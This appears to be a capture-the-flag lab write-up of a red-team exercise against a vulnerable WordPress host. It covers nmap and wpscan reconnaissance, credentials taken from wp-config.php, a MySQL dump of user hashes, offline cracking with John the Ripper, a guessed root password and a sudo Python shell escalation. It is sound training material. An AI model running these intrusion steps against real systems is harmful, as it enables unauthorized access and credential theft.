# Red Team: Summary of Operations

## Table of Contents
- Exposed Services 
- Critical Vulnerabilities
- Exploitation

### Exposed Services

To begin a couple of nmap scans had to be done.  The first was to find which hosts were up.
  - Note: The "-sS" flag was used to quickly perform a TCP SYN scan on all hosts and the "-vv" was to display verbose output. 

```
nmap -sS -vv 192.168.1.0/24
```
The second scan was ran to reveal the below services and OS details.
  - Note: The "-A" flag tells nmap to scan for operating systems and services.
```
nmap -A 192.168.1.0/24
```
![nmap_OS_GitHub](https://user-images.githubusercontent.com/96896057/180900970-cde5b2a9-797e-4be8-8f8b-8d4144ed46a1.png)

This scan identifies the services below as potential points of entry:
- Target 1
  - ssh port 22
  - http port 80
  - rpcbind port 111
  - netbios-ssn port 139
  - microsoft-ds port 445


The following vulnerabilities were identified on each target:
- Target 1
  - ssh is open 
  - http is open
  - the http has a vulnerable Wordpress server

![nmap_GitHub](https://user-images.githubusercontent.com/96896057/180901150-349de607-5be8-4917-bdaa-220ea62f1844.jpg)

### Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
```
flag1.txt`{b9bbcb33e11b80be759c4e844862482d}
```
![flag1_GitHub](https://user-images.githubusercontent.com/96896057/180901342-66075ffa-1e88-42cf-9166-1c5b888109db.png)
- **Exploit Used**
      - ssh to users host after exploting vulnerable worpress server
        ![ssh_michael_GitHub](https://user-images.githubusercontent.com/96896057/180901239-6bba5f41-7242-413c-a7d7-3c352ac368be.jpg)

  ```
  flag2.txt`{fcfd58dcdad9ab23faca6e9a36e581c}
  ```  
![flag2_GitHub](https://user-images.githubusercontent.com/96896057/180901877-b20cc13d-f233-4406-b8e8-7b0fb698572f.png)
    
- **Exploit Used**
      - Searching content of directories.


We then ran a wpscan to see what the site was vulnerable to:

![Flag2_GitHub](https://user-images.githubusercontent.com/96896057/180901445-deee105a-67b8-460b-b804-2bdd32d45b44.jpg)

We moved into the /var/www/html/wordpress/ directory and read the contents of the wp-config.php file to reveal the following useful information:

![MySQLServer_GitHub](https://user-images.githubusercontent.com/96896057/180903525-81afe1ee-4d33-4ccd-9947-013d46d828ca.jpg)

To gain access to the SQL database while still logged in as michael we ran the following command:
    
```
mysql -u root -p
```
This gave us access to the server once we entered the credentials we found:
```
DB_User: root
DB_PASSWORD: R@v3nSecurity
```

Once inside the process of finding the other flags was done entering the following ccommands in this order:
```
show databases;
```

```
use wordpress;
```
```
show tables;
```
```
select * from wp_posts;
```
Browsing the output of the "select * from wp_posts" command gave use flag3 as shown below.
```
flag3.txt`{afc01ab56b5091e7dccf93122770cd2}
```
![flag3](https://user-images.githubusercontent.com/96896057/180903358-fefd2ed2-132e-4cf2-a75b-8e286d049e82.png)
- **Exploit Used**
      - We scanned the contents of the database to find the flag and also the users hashes, which were otained with the following command: 
```
select * from wp_users;
```
This outputted the following information:
        ![SQLContents_GitHub](https://user-images.githubusercontent.com/96896057/180902241-c9a80858-db0a-4a66-8007-ca2cda4b889f.jpg)
- **Exploit Used**
      - Once we have the hash values we copied them to a text file so we could crack them using John the Ripper offline.

![John_GitHub](https://user-images.githubusercontent.com/96896057/181392772-36f44b53-c955-445e-adc8-5a77fed48129.png)
This gave us the password value of "pink84" for steven's account.  After John is finished we can log onto steven's account, he was not included in the sudoers group, but simply by guessing we were able to find the root login password as:
```
Username: root
Password: toor
```
```
flag4.txt`{715ea6c055b9fe3337544932f291ce}
```
  ![FinalFlagRaven](https://user-images.githubusercontent.com/96896057/181392857-f4ecb93d-9390-4421-821f-1639548f18f4.png)

___
***Update:*** Upon returning to this box I ran the following command while logged in as steven:
```
sudo -l
```
This showed that steven has sudo permission's to run Python.  Upon further reading I found the following Python command can be used to properly gain 'root' on the Target1 machine:

```
sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
```

![steven_sudo_root_ptycmd](https://user-images.githubusercontent.com/96896057/181854516-6cc51591-8e41-4f41-b743-aec50c96d92b.png)